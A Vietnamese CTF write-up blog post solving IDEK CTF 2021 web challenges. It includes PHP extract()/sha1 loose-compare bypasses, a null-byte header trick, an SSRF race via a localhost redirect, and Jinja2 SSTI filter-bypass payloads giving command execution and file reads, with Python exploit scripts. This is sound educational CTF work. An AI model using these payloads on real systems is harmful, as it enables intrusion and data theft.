---
layout: post
title: "WRITEUP IDEK CTF 2021: WEB"
categories: CTF
toc: true
render_with_liquid: false
---
CTF này được tổ chức bởi team mà mình đang tham gia (idek), nhưng khi mình vô thì ctf này đã hoàn thiện về các challenge nên mình không đóng góp bất kì challenge nào trong ctf này. Vì vậy mình thử sức chơi một số bài web do teammate mình tạo ra. Những thử thách sau đây cũng khá hay và có nhiều thứ để học. Trong ctf này mình đã không giải 4 challenge client side, mình yếu cái này và do cũng mấy nay cũng bận nên không có thơi gian nghiên cứu. Mình có để tất cả source của all challenge web ở phía dưới nên mọi người có thể download về và test nhé.

Tất cả source code mình để ở đây nhé [SOURCE](https://github.com/DauHoangTai/WriteupCTF/tree/master/2021/idekctf)

## Challenge Cookie-and-milk
Bài này được cung cấp source php khi chúng ta truy cập vô challenge

```php
include(__DIR__."/lib.php");
extract($_GET);

if ($_SESSION['idek'] === $_COOKIE['idek'])
{
    echo "I love c0000000000000000000000000000000000000kie";
}

else if ( sha1($_SESSION['idek']) == sha1($_COOKIE['idek']) )
{
    echo $flag;
}

show_source(__FILE__);
?>
```
Phân tích source 1 chút xíu nhé:
+ Đầu tiên sẽ include 1 file `lib.php` -> chúng ta không biết nó chứa gì
+ Function `extract` để lấy tất cả các tham số mà chúng ta đưa vào bằng GET method. (vuln đầu tiên của bài này cũng ở đây). Giải thích về hàm này thì khi chúng ta truyền các tham số thì sẽ ghi đè được các biến internal.
+ Check session `idek` và cookie `idek` bằng nhau thì sẽ echo ra chuỗi `I love c0000000000000000000000000000000000000kie`.
+ Nếu 2 session và cookie không bằng nhau thì kiểm tra sha1 của cookie và sha1 session bằng nhau thì sẽ in ra `flag`. Nhưng ở đây chỉ sử dụng dấu `==` (loose compare) => vuln thứ 2 của bài này.

### IDEA
Dựa vào 2 vuln mình đã nói ở trên thì bây giờ mình chỉ cần viết payload:
+ Lợi dụng hàm `extract` truyền vô 2 tham số `_COOKIE[idek]` và `_SESSION[idek]` khác giá trị nhau thì sẽ nhảy vô được nhánh `else`.
+ Lợi dụng so sánh `==` để truyền 2 giá trị khác nhau nhưng kết quả trả về là `true` => có `flag`
+ Các chuỗi mà giá trị khác nhau nhưng khi sha1 và loose compare sẽ trả về true thì mình để ở đây [SHA1](https://github.com/spaze/hashes/blob/master/sha1.md)

### Payload
```
http://cookie-and-milk.rf.gd/?_SESSION[idek]=aaroZmOk&_COOKIE[idek]=aaK1STfY&i=1
```
Result:

![image](https://user-images.githubusercontent.com/54855855/146053545-d98c1d4c-a528-49e3-a6e2-e551369eec4c.png)

## Challenge Memory of PHP
Bài này vẫn là 1 bài php và được cung cấp source khi truy cập challenge.
```php
<?php

include(__DIR__."/lib.php");
$check = substr($_SERVER['QUERY_STRING'], 0, 32);
if (preg_match("/best-team/i", $check))
{
    echo "Who is the best team?";
}
if ($_GET['best-team'] === "idek_is_the_best")
{
    echo "That a right answer, Here is my prize, <br>";
    echo $flag;
}
show_source(__FILE__);
?>
```
Phân tích source:
+ include file `lib.php` và chúng ta không biết file này chứa gì.
+ Biến `check` sẽ được gán bằng giá trị nằm trong array `$_SERVER['QUERY_STRING']`(các tham số mình nhập vô GET).
+ Kiểm tra `best-team` nằm trong biến `check` thì sẽ echo ra chuỗi `Who is the best team?`.
+ Tiếp tục kiểm tra `$_GET['best-team']` bằng với `idek_is_the_best` thì sẽ in ra `flag` (nhưng lừa đấy).

### IDEA
Ở đây chúng ta chỉ cần truyền 2 tham số `best-team`
+ `best-team` thứ nhất với giá trị bất kì, được gán vô check và kiểm tra `preg_match`.
+ `best-team` thứ hai là của `$_GET['best-team']` và chúng tra truyền giá trị `idek_is_the_best` => echo ra flag.
```
http://memory-of-php.rf.gd/?best-team=a&best-team=idek_is_the_best
```
Sau khi mình send với request như này thì sẽ nhận được 

![image](https://user-images.githubusercontent.com/54855855/146055394-00c98521-0e84-4108-b2fe-a1bc0adc536c.png)

Vậy tiếp tục ta sẽ access vô `/secure-bypass.php` => get được 1 source mới
```php
<?php
include __DIR__."/lib2.php";
if (isset($_GET['url'][15]))
{
    header("location: {$_GET['url']}");
    echo "Your url is interesting, here is prize {$flag} <br>";
}
else
{
    echo "Plz make me interest with your url <br>";
}
show_source(__FILE__);
?>
```
Phân tich source:
+ Check có tham số `url` truyền vào bằng `GET` method, và độ dài phải ít nhất là 15.
+ Sau đó sẽ `redirect` tới cái url mình truyền vô, sẽ echo `flag` sau khi redirect đó. Vậy ở đây nếu như echo flag nằm trên `header` fuction thì mình có thể dùng burp để bắt lại và có flag.
+ Nhưng ở đây thì ngược lại nên mình chỉ cần truyền `CLRF` hoặc `nullbyte` thì có thể bypass đoạn này.

### Payload
+ Payload đầu tiên
```
http://memory-of-php.rf.gd/?best-team=a&best-team=idek_is_the_best
```
+ Payload thứ hai
```
http://memory-of-php.rf.gd/secure-bypass.php?url=taidh_hahahahahahahaha%00
```
Result:

![image](https://user-images.githubusercontent.com/54855855/146056438-5fab170b-5dc8-41fa-b520-0123cc0340d3.png)

## Challenge Sourceless Guessy Web
Bày này thì như tên bài thì có một chút guessy. Chúng ta không được cung cấp source, chỉ có mỗi url. Khi truy cập vào thì cũng được cảnh báo rằng không được `scan dir` nếu không sẽ bị block IP.

Mình thử truy cập `/robots.txt` (những bài guessy mình sẽ thử cái này đầu tiên ) thì nhận được 

![image](https://user-images.githubusercontent.com/54855855/146057019-0a460f2a-fa60-4c61-909f-2d281defb8b8.png)

Có vẻ liên quan đến `replit.com`. Tới đây mình nhớ về một bài mình đã đọc qua ở `replit` (mình sài cái này khá nhiểu :D). Nội dung bài viết mình để ở đây [Tip_Replit](https://replit.com/talk/learn/ProTip-add-__repl-to-a-website-or-webapp-to-get-the-repl/7142)

Nếu như thêm `__repl` thì nó sẽ redirect tới source repl của url này. Mình đã thử và get được flag thành công.

### Payload
```
https://sgw.chal.imaginaryctf.org/__repl
```
Result:

![image](https://user-images.githubusercontent.com/54855855/146057754-7e13499d-2948-4781-837e-839526eca06d.png)

## Challenge difference-check
Bài này, chúng ta được chung cấp 1 source được viết bằng `node js`, có cung cấp docker nên mọi người có thể deploy để debug cho hiểu rõ về code hoạt động như nào hơn nhé. Sau đây, mình chỉ phân tích một đoạn code để dẫn đến việc có thể khai thác ở bài này.

Phân tích source:
```js
app.get('/flag', (req, res) => {
	if(req.connection.remoteAddress == '::1'){
		res.send(flag)}
	else{
		res.send("Forbidden", 503)}
});

app.post('/diff', async (req, res) => {
	let { url1, url2 } = req.body
	if(typeof url1 !== 'string' || typeof url2 !== 'string'){
		return res.send({error: 'Invalid format received'})
	};
	let urls = [url1, url2];
	for(url of urls){
		const valid = await validifyURL(url);
		if(!valid){
			return res.send({error: `Request to ${url} was denied`});
		};
	};
	const difference = await diffURLs(urls);
	res.render('diff', {
		lines: difference
	});

});
```
+ Mình chỉ chú ý vào 2 router chính này `/flag` và `/diff`.
+ Router `/flag`: Check địa chỉ của mình truy cập bằng với `::1` (localhost) thì sẽ in ra flag không thì sẽ trả về `Forbidden`.
+ Router `/diff`:
    + Nhận 2 tham số `url1` và `url2`. Kiểm tra phải là string.
    + Lưu 2 tham số trên vào array `urls`. Sau đó đưa từng tham số url vào function `validifyURL`.
    ```js
    async function validifyURL(url){
	valid = await fetch(url, {agent: ssrfFilter(url)})
	.then((response) => {
		return true
	})
	.catch(error => {
		return false
	});
	return valid;
    };
    ```
    + Các url sẽ được đưa vô `ssrfFilter`, hàm này mình không biết nó như nào, chỉ biết được require vô `const ssrfFilter = require('ssrf-req-filter');` ở đầu file. Nhưng mình đoán sẽ ra chặn các request từ localhost.
    + Sau khi check xong thì sẽ đưa array `urls` vô hàm `diffURLs`
    ```js
    async function diffURLs(urls){
	try{
		const pageOne = await fetch(urls[0]).then((r => {return r.text()}));
		const pageTwo = await fetch(urls[1]).then((r => {return r.text()}));
		return Diff.diffLines(pageOne, pageTwo)
	} catch {
		return 'error!'
	}
    };
    ```
    + Ở hàm này thì không được check `ssrfFilter` mà chỉ `fetch` tới từng `url` mà mình đưa vào. Sau đó dùng hàm `diffLines` để check sự khác nhau của từng line.
    + Cuối cùng render ra kết quả khác nhau về content của 2 url theo từng line.

### IDEA
Khi mình nhìn vô challenge thì thấy có vẻ nghi nghi `DNS Rebinding`. Và sau khi đọc code và phân tích thì mình sure bài này dạng `DNS Rebinding`, tương tự như 1 bài mình đã ra đề cho `ISITDTU CTF 2021 Quals`. Idea ở đây:
+ Chú ý thì thấy chỉ check `ssrfFilter` ở hàm `validifyURL` còn `diffURLs` thì sẽ không check, như mình đã phân tích ở trên
+ Vậy ở đây mình chỉ cần host 1 file `php` với content sẽ `redirect` tới `http://localhost:1337/flag` (1337 vì port đang run của challenge) để get flag. Mình sẽ `random` giữa khoảng 0->1, nếu như 0 thì sẽ return về bình thường, còn 1 thì sẽ `redirect` tới `http://localhost:1337/flag`.
+ VD: khi ở hàm `validifyURL` check filter thì sẽ là `ramdom = 0` => return về bình thường không phải localhost. Tiếp xuống hàm `diffLines` sẽ không check filter và khi fetch tới `url` của mình đã host thì có thể khi đó `random sẽ bằng 1` (chính là `localhost`) => có thể đọc đc flag. Ở đây vì dựa vô độ "may mắn" nữa nên mọi người cần race nhé.

### Payload
File `index.php`
```php
<?php
$temp = rand(0,1);
if ($temp == 1) {
    header("Location: http://localhost:1337/flag");
}
```
How to run:
+ `php -S 0.0.0.0:1234`
+ `ngrok http localhost:1234`

File `payload.py`
```py
import requests
from threading import Thread

chall_url = 'http://difference-check.chal.idek.team'
my_url = "http://fe27-14-243-53-28.ngrok.io"

def payload():
    data = {"url1": my_url, "url2": "http://google.com"}
    r = requests.post(chall_url+'/diff', data=data)
    print(r.text)

if __name__ == '__main__':
    for i in range(1,5):
        thread = Thread(target=payload)
        thread.start()
```
How to run:
+ `python3 payload.py | grep 'idek'`

Result:

![image](https://user-images.githubusercontent.com/54855855/146064487-d648ca81-27cf-4dda-95aa-b633201b0acf.png)

## Challenge Baby JinJail and jinjail
Lí do mình gộp 2 challenge này thành 1 bài để viết vì mình sử dụng 1 payload để solves cả 2 challenge này. Source của 2 bài cũng giống nhau chỉ khác 1 chỗ.

Giống như các bài có source khác, việc đầu tiên là đi phân tích source để biết chương trình làm gì, như vậy thì sẽ exploit hơn.

Phân tích source:
{% highlight python %}
{% raw %}
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if not request.form['q']:
            return render_template_string(error_page)

        if len(request.form) > 1:
            return render_template_string(error_page)

        query = request.form['q'].lower()
        if '{' in query and any([bad in query for bad in blacklist]):
            return render_template_string(error_page)

        page = \
            '''
        {{% extends "layout.html" %}}
        {{% block body %}}
        <center>
           <section class="section">
              <div class="container">
                 <h1 class="title">You have entered the raffle!</h1>
                 <ul class=flashes>
                    <label>Hey {}! We have received your entry! Good luck!</label>
                 </ul>
                 </br>
              </div>
           </section>
        </center>
        {{% endblock %}}
        '''.format(query)

    elif request.method == 'GET':
        page = \
            '''
        {% extends "layout.html" %}
        {% block body %}
        <center>
            <section class="section">
              <div class="container">
                 <h1 class="title">Welcome to the idekCTF raffle!</h1>
                 <p>Enter your name below for a chance to win!</p>
                 <form action='/' method='POST' align='center'>
                    <p><input name='q' style='text-align: center;' type='text' placeholder='your name' /></p>
                    <p><input value='Submit' style='text-align: center;' type='submit' /></p>
                 </form>
              </div>
           </section>
        </center>
        {% endblock %}
        '''
    return render_template_string(page)
{% endraw %}
{% endhighlight %}

+ Source chỉ có 1 router này và nó cũng là router chính của bài.
+ Check có tham số `q` đưa vào với POST method, không được đưa vô nhiều hơn 1 tham số.
+ Check các element trong `blacklist` có trong input chúng ta đưa vào hay không.
+ Nếu các check ở trên trả về `false` thì sẽ `render_template_string` ra template `error_page`.
+ Dù nếu `false` thì vẫn sài `render_template_string` (có thể SSTI) nhưng ở template `error_page` lại không đưa bất kì input nào của chúng ta vào template này => impossible SSTI ở đây.
+ Nếu vượt qua được các check thì chương trình sẽ `render_template_string` ra template `page`, ở trong template này có đưa input của chúng ta vào là `query` (chính là `q`). Vừa sử dụng `render_template_string` vừa đưa input của chúng ta vô template => có thể SSTI ở đây.
+ Điều quan trọng ở đây là chúng ta cần vượt qua được `blacklist`
{% highlight python %}
{% raw %}
blacklist = [ 'request','config','self','class','flag','0','1','2',
'3','4','5','6','7','8','9','"','\'','.','\\','`','%','#',]
{% endraw %}
{% endhighlight%}
+ Ở đây thì các payload đơn giản hay thường gặp đã bị filter hết. Mình check thì thấy một số kí tự sau không bị filter và có thể sài được => `() [] join | dict ~ cycler attr`.

### IDEA
+ mình sử dụng payload đơn gian này: `{% raw %}{{cycler.__init__.__globals__.os.popen('id').read()}}{% endraw %}`
+ Bypass `.` = `|attr()`
+ Bypass `" '` = `dict()|join`

### Payload
Payload đầu tiên của mình thử như sau:
{% highlight text %}
{% raw %}
{{((cycler|attr(dict(__ini=a,t__=b)|join)|attr(dict(__glob=c,als__=d)|join))[dict(o=m,s=n)|join]|attr(dict(po=s,pen=y)|join))(dict(l=ii,s=dd)|join)|attr(dict(re=re,ad=ad)|join)()}}
{% endraw %}
{% endhighlight text %}
+ Để nhìn rõ hơn về payload này thì mình sẽ viết ra chuỗi trên nó sẽ tạo ra như sau: 
{% highlight text %}
{% raw %}
{{cycler.__init__.__globals__.os.popen(ls).read()}}
{% endraw %}
{% endhighlight %}
+ Payload này có thể rce nhưng mình không tìm đc cách đọc được flag, vì cần đọc được flag thì cần `cat flag` hoặc `... flag` (... ở đây có nghĩa là 1 lệnh nào đó), nhưng điểm chung của mấy command này là đều cần có khoảng trắng, nhưng mình không nghĩ ra cách đoạn này. Nếu dùng các kí tự để bypass khoảng trắng thì server sẽ trả về 500.

Payload thứ hai:
{% highlight text %}
{% raw %}
{{(cycler|attr(dict(__ini=a,t__=b)|join)|attr(dict(__glob=c,als__=d)|join))[dict(__buil=buil,tins__=tins)|join][dict(op=op,en=en)|join](dict(fl=fl,ag=ag)|join)|attr(dict(re=re,ad=ad)|join)()}}
{% endraw %}
{% endhighlight %}
+ Payload trên sẽ kiểu: 
{% highlight text %}
{% raw %}
{{cycler.__init__.__globals__.__builtins__.open("flag").read()}}
{% endraw %}
{% endhighlight %}
+ Payload này là sư phụ mình đã nhìn thấy trong `__builtins__` có attribute `open` => đọc thẳng `flag` luôn.

Result:

![image](https://user-images.githubusercontent.com/54855855/146140899-65389e88-50dc-482e-848e-a6568e9a6463.png)

Bài `jinjail` thì source vẫn tương tự nhưng chỉ check length của input của chúng ta nhập vào > 256 thì sẽ trả về false. Nhưng payload của mình ở trên < 256 => dùng 1 payload cho 2 bài.

Script:
{% highlight python%}
{% raw%}
# payload.py
import requests

url1 = 'http://baby-jinjail.chal.idek.team/'
url2 = 'http://jinjail.chal.idek.team/'

data = {"q":"{{(cycler|attr(dict(__ini=a,t__=b)|join)|attr(dict(__glob=c,als__=d)|join))[dict(__buil=buil,tins__=tins)|join][dict(op=op,en=en)|join](dict(fl=fl,ag=ag)|join)|attr(dict(re=re,ad=ad)|join)()}}"}
print("Flag baby-jinjail: ",requests.post(url1,data=data).text)
print("Flag jinjail: ",requests.post(url2,data=data).text)
{% endraw %}
{% endhighlight %}

How to run:
+ `python3 payload.py | grep "idek"`